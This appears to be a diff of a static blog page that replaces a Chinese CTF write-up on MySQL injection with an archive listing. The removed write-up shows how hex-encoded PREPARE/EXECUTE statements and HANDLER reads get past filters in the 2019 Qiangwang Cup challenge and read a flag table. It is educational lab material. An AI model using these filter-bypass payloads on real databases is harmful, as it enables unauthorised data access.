@@ -157,7 +157,7 @@
     </script>
     
     <script defer type="text/javascript" src="/LawlietLW.github.io/js/custom.js"></script>
-    <title>MySQL注入 | Lock's blog</title>
+    <title>歸檔 | Lock's blog</title>
   <meta name="generator" content="Hexo 4.1.1"><link rel="stylesheet" href="/LawlietLW.github.io/css/prism-tomorrow.css" type="text/css"></head>
   <body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN"  data-spy="scroll" data-target=".list-group">
     
@@ -199,101 +199,31 @@
         <div class="main-container">
           <div class="content">
             
-<div id="post" class="page">
+<div id="archive" class="archive page">
+  <h1 class="page-title">歸檔</h1>
+  <h2 class="page-counter">
+    
+    你已經寫了 23 篇文章！
+    
+  </h2>
+  
+  
+  
+  
+  <h2 class="page-title">2020</h1>
   
   <article class="article post card" itemscope itemtype="http://schema.org/Article">
-    <div class="post-block">
-      <link itemprop="mainEntityOfPage" href="http://LawlietLW.github.io/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/">
-      <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-       <meta itemprop="name" content="Lock">
-       <meta itemprop="description" content="">
-       <meta itemprop="image" content="/LawlietLW.github.io/images/1.jpeg">
+    <header id="post-header" class="post-header">
+      <h1 class="post-title-simple" itemprop="name headline">
+        <a class="post-title-link post-title-link-external" href="/LawlietLW.github.io/2020/03/10/xss/" itemprop="url">xss</a>
+      </h1>
+      
+      <span class="post-date">
+        <time title="post-date" itemprop="dateCreated datePublished" datetime="2020-03-10T18:25:57+08:00">03-10</time>
       </span>
-      <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-       <meta itemprop="name" content="Lock's blog">
-      </span>
-    </div>
-    <header class="post-header">
-      <h1 class="post-title" itemprop="name headline">MySQL注入</h1>
-      <div class="post-meta">
-        
-        <span class="post-date">
-          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2020-02-15T12:41:27+08:00">2020-02-15 12:41:27</time></span>
-        </span>
-        
-        
-        
-        <span class="post-meta-divider divider">|</span>
-        
-        <span class="post-categories">
-          
-          <i class="far fa-folder-open"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/LawlietLW.github.io/categories/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">SQL注入</span></a></span>
-        </span>
-        
-        
-      </div>
+      
     </header>
-    <main class="post-main" itemprop="articleBody">
-      <p>复习了一下SQL注入，发觉还很有一部分知识点没掌握，记录一下<br>以2019强网杯随便注为例，之前是用的更改列名和表名来做的，但相对于利用MySQL预处理语句来做要麻烦很多，先了解一下MySQL的预处理语句</p>
-<figure class="hljs highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><code class="language-hljs sql">语法：<br>定义预处理语句<br>PREPARE stmt_name FROM preparable_stmt;<br>执行预处理语句<br>EXECUTE stmt_name [USING @var_name [, @var_name] ...];<br>删除(释放)定义<br>{DEALLOCATE | DROP} PREPARE stmt_name;<br>set语句可用于向系统变量或用户变量赋值，针对用户变量的定义如下：<br>SET @var_name = expr [, @var_name = expr] ...<br></code></pre></td></tr></tbody></table></figure>
-<p>简单来说，预定义语句就类似于C的define关键字<br>再来看题<br>我们已经知道了flag在1919810931114514表中<br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/1.jpg" alt=""><br>不在我们当前表中，需要跨表查询，但能够查询的语句都被过滤掉了<br>这时我们可以利用预定义语句，如下</p>
-<figure class="hljs highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">Set</span> @a=<span class="hljs-number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<br><span class="hljs-comment">#0x73656c656374202a2066726f6d20603139313938313039333131313435313460是select * from `1919810931114514`的16进制编码</span><br><span class="hljs-keyword">Prepare</span> x <span class="hljs-keyword">from</span> @a<br><span class="hljs-keyword"><code class="language-hljs sql"><span class="hljs-keyword">Set</span> @a=<span class="hljs-number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<br><span class="hljs-comment">#0x73656c656374202a2066726f6d20603139313938313039333131313435313460是select * from `1919810931114514`的16进制编码</span><br><span class="hljs-keyword">Prepare</span> x <span class="hljs-keyword">from</span> @a<br><span class="hljs-keyword">Execute</span> x<br></code></pre></td></tr></tbody></table></figure>
-<p>第一句相当于把变量@a赋值为0x73656c656374202a2066726f6d20603139313938313039333131313435313460<br>第二句将@a预编译为x<br>第三句执行x<br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/2.jpg" alt=""><br>可以获得flag</p>
-<p>再来看另一种方法</p>
-<figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">handler语句代替select查询<br>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中<br></code></pre></td></tr></tbody></table></figure>
-<figure class="hljs highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre class=" language-hljs sql">语法结构<br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">OPEN</span> [ [<span class="hljs-keyword">AS</span>] <span class="hljs-keyword">alias</span>]<br><br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">READ</span> index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [<span class="hljs-keyword">LIMIT</span> ... ]<br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">READ</span> index_name { <span class="hljs-keyword">FIRST</span> | <span class="hljs-keyword">NEXT</span> | PREV | <span class="hljs-keyword">LAST</span> }<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [<span class="hljs-keyword">LIMIT</span> ... ]<br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">READ</span> { <span class="hljs-keyword">FIRST</span> | <span class="hljs-keyword">NEXT</span> }<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [<span class="hljs-keyword">LIMIT</span> ... ]<br><br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword"><code class="language-hljs sql">语法结构<br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">OPEN</span> [ [<span class="hljs-keyword">AS</span>] <span class="hljs-keyword">alias</span>]<br><br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">READ</span> index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [<span class="hljs-keyword">LIMIT</span> ... ]<br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">READ</span> index_name { <span class="hljs-keyword">FIRST</span> | <span class="hljs-keyword">NEXT</span> | PREV | <span class="hljs-keyword">LAST</span> }<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [<span class="hljs-keyword">LIMIT</span> ... ]<br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">READ</span> { <span class="hljs-keyword">FIRST</span> | <span class="hljs-keyword">NEXT</span> }<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [<span class="hljs-keyword">LIMIT</span> ... ]<br><br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">CLOSE</span><br></code></pre></td></tr></tbody></table></figure>
-<p>我用本地的sqli-lab的secruity库的users表来测试<br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/3.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/4.jpg" alt=""><br>能够一行一行地读取表中的内容<br>再回到题目<br>我们的sql语句如下</p>
-<figure class="hljs highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">handler</span> \<span class="hljs-string">`1919810931114514\`</span> <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> a <br><span class="hljs-keyword">handler</span> a <span class="hljs-keyword">read</span> <span class="hljs-keyword"><code class="language-hljs sql"><span class="hljs-keyword">handler</span> \<span class="hljs-string">`1919810931114514\`</span> <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> a <br><span class="hljs-keyword">handler</span> a <span class="hljs-keyword">read</span> <span class="hljs-keyword">next</span><br></code></pre></td></tr></tbody></table></figure>
-<p><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/5.jpg" alt=""><br>同样能够读取flag</p>
-<p>预编译语句说完了，再看到无列名注入</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>
-    </main>
-    <footer class="post-footer">
-      
-      <div class="post-tags">
-        
-        <a class="post-tag button" href="/LawlietLW.github.io/tags/MySQL%E9%A2%84%E5%A4%84%E7%90%86/" rel="tag"><i class="fas fa-tags"></i>MySQL预处理</a>
-        
-        <a class="post-tag button" href="/LawlietLW.github.io/tags/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fas fa-tags"></i>无列名注入</a>
-        
-        <a class="post-tag button" href="/LawlietLW.github.io/tags/order-by%E7%9B%B2%E6%B3%A8/" rel="tag"><i class="fas fa-tags"></i>order by盲注</a>
-        
-      </div>
-      
-    </footer>
   </article>
-  
-  
-  <nav class="page-nav">
-    <div class="page-nav-next page-nav-item">
-      
-      <a href="/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/" rel="next" title="动态规划的背包问题"><i class="fas fa-angle-left"></i><span class="nav-title">动态规划的背包问题</span></a>
-      
-    </div>
-    <div class="page-nav-prev page-nav-item">
-      
-      <a href="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/" rel="prev" title="堆学习记录"><span class="nav-title">堆学习记录</span><i class="fas fa-angle-right"></i></a>
-      
-    </div>
-  </nav>
   
   
 </div>
@@ -355,11 +285,6 @@
 
 
   <div class="sidebar-sticky">
-    
-    
-    
-    
-    
     
     
     
